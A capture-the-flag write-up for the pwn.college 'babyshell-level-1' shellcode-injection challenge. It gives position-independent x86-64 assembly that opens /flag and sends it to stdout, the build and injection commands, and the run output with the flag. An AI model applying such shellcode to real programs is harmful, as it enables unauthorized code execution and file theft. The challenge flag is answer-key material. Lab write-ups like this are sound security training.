# level1
## Description
Write and execute shellcode to read the flag!
## Solution
- The challenge file in `/challenge` is `babyshell-level-1`. Running it:
```
###
### Welcome to ./babyshell-level-1!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffce7d8f4b0!
Reading 0x1000 bytes from stdin.
```
- I used the shellcode and steps as instructed in the slides and lecture videos to read the flag.
- First, I made the following `shellcode.s` file:
```assembly
.intel_syntax noprefix
    mov rbx, 0x00000067616c662f	# push "/flag" filename
    push rbx
    mov rax, 2				    # syscall number of open
    mov rdi, rsp				# point the first argument at stack (where we have "/flag")
    mov rsi, 0				    # NULL out the second argument (meaning, O_RDONLY)
    syscall				        # trigger open("/flag", NULL)
    mov rdi, 1				    # first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax				# second argument is the file descriptor returned by open
    mov rdx, 0				    # third argument is the number of bytes to skip from the input file
    mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
    mov rax, 40				    # syscall number of sendfile
    syscall				        # trigger sendfile(1, fd, 0, 1000)
    mov rax, 60				    # syscall number of exit
    syscall				        # trigger exit()
```
- Then, I compiled it using the following command: `gcc -nostdlib -static shellcode.s -o shellcode-elf`.
- Then, I extracted the shellcode using the following command: `objcopy --dump-section .text=shellcode-raw shellcode-elf`.
- Then, I sent the shellcode to the `stdin` of the challenge using the following command: `cat shellcode-raw /dev/stdin | /challenge/babyshell-level-1`. This gave me the flag:
```
###
### Welcome to /challenge/babyshell-level-1!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffc8e91e800!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffc8e91e800 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffc8e91e80a | 53                                            | push rbx
0x00007ffc8e91e80b | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffc8e91e812 | 48 89 e7                                      | mov rdi, rsp
0x00007ffc8e91e815 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffc8e91e81c | 0f 05                                         | syscall 
0x00007ffc8e91e81e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffc8e91e825 | 48 89 c6                                      | mov rsi, rax
0x00007ffc8e91e828 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffc8e91e82f | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffc8e91e836 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffc8e91e83d | 0f 05                                         | syscall 
0x00007ffc8e91e83f | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffc8e91e846 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{kUKly3S5RudW4hbKobSSkBixBCJ.01NxIDL5QTO0czW}
```
- The flag is `pwn.college{kUKly3S5RudW4hbKobSSkBixBCJ.01NxIDL5QTO0czW}`.